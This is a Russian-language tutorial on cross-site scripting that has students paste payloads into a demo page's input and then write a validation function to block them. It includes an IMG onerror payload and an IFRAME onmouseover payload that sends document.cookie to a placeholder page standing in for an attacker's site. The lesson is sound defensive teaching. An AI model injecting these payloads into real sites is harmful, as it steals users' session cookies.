# ![ico-30 study] XSS

XSS ( Cross-Site Scripting — «межсайтовый скриптинг» ) — атака на веб-систему путем инъекции вредоносного кода
^^вместо "C" используется "X", чтобы не было путаницы с CSS^^

Внедренный код будет выполняться на компьютере пользователя
Код может пересылать конфиденциальные данные  пользователя  веб-серверу хакера

Разновидностей XSS-атак очень много
Частично они отражаются на уровне браузера
В данном примере мы  будем внедрять код при вводе пользовательских данных
и использовать обработчиков событий элементов для запуска внедренного кода

[![ico-20 link] Перейдите по ссылке](https://garevna.github.io/js-samples/#03)

Откройте **~Chrome DevTools~**

Установите точки останова  ( ~breakpoints~ ) для того, чтобы пошагово отслеживать выполнение кода и вносить изменения в код

1. Скопируйте код ниже и вставьте его в поле ввода элемента ~input~:

~~~html
<IMG SRC="images/hack.png"
     onerror="document.write ( String.fromCharCode ( 88, 83, 83) )"/>
~~~

это довольно безобидная "атака", которая просто перезапишет содержимое ~body~

2. Скопируйте код ниже и вставьте его в поле ввода элемента ~input~:

~~~html
<IFRAME SRC=js/attack.html
        onmouseover="window.open ( 'https://garevna.github.io/js-samples/js/attack.html#' + document.cookie, '_self' )">
</IFRAME>
~~~

^^с помощью такой строки можно украсть куки с компьютера пользователя, где хранится конфиденциальная информация о нем^^

Обратите внимание, что вместо ссылки ![ico-20 cap] ~https://garevna.github.io/js-samples/js/attack.html~

в реальной атаке будет ссылка на сайт ( страницу ) хакера

## ![ico-25 hw] Задание

В панели навигации откройте файл **~js/index03.js~**

Обратите внимание на функцию валидации ввода пользователя  ( **~testUserText~** )

В случае XSS атаки функция должна заменить текст, введенный пользователем, на сообщение: "*XSS атака отражена*" с указанием текущей даты и времени

__________________________________________________________

[![ico-20 link] securitylab](https://www.securitylab.ru/analytics/432835.php)
[![ico-20 link] websitesecurity](https://www.acunetix.com/websitesecurity/cross-site-scripting/)
